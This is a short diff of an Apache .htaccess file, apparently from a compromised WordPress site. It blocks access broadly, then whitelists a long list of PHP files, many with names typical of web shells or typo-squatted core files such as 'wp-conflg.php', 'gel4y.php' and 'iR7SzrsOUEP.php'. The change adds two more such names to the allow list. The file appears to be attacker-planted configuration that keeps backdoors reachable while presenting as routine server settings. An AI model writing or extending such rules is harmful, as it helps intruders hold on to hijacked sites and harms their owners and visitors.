@@ -10,7 +10,7 @@ RewriteRule . index.php [L]
 Order Allow,Deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(index.php|wp-login.php|skxx.php|wp-blog-header.php|style.php|style2.php|wp-conflg.php|index.php|class.api.php|iR7SzrsOUEP.php|license.php|gel4y.php|wp-blog.php|moon.php|wp-add.php|plugin-install.php|admin.php|wp-sigunq.php|my1.php|wp-add.php|wp-add.php|wp-configs.php|lang-core-option.php|init.inc-media.php|dist-walker-sitemaps.php|lang.widgets-loader.php|config.vars-nav.php|class.core-api.php|init-core-style.php|iR7SzrsOUEP.php|style.php|class.rest-style.php|class.vars-conf.php|config-site-compat.php|init-rest-role.php|init.load-option.php|init.core-locale.php|init.inc-meta.php|class-rest-compat.php|lang.site-http.php|config.rest-api.php|lang.inc-nav.php|lang-walker-tokens.php)$">
+<FilesMatch "^(index.php|wp-login.php|skxx.php|wp-blog-header.php|style.php|style2.php|wp-conflg.php|index.php|class-mate.php|data-db.php|class.api.php|iR7SzrsOUEP.php|license.php|gel4y.php|wp-blog.php|moon.php|wp-add.php|plugin-install.php|admin.php|wp-sigunq.php|my1.php|wp-add.php|wp-add.php|wp-configs.php|lang-core-option.php|init.inc-media.php|dist-walker-sitemaps.php|lang.widgets-loader.php|config.vars-nav.php|class.core-api.php|init-core-style.php|iR7SzrsOUEP.php|style.php|class.rest-style.php|class.vars-conf.php|config-site-compat.php|init-rest-role.php|init.load-option.php|init.core-locale.php|init.inc-meta.php|class-rest-compat.php|lang.site-http.php|config.rest-api.php|lang.inc-nav.php|lang-walker-tokens.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
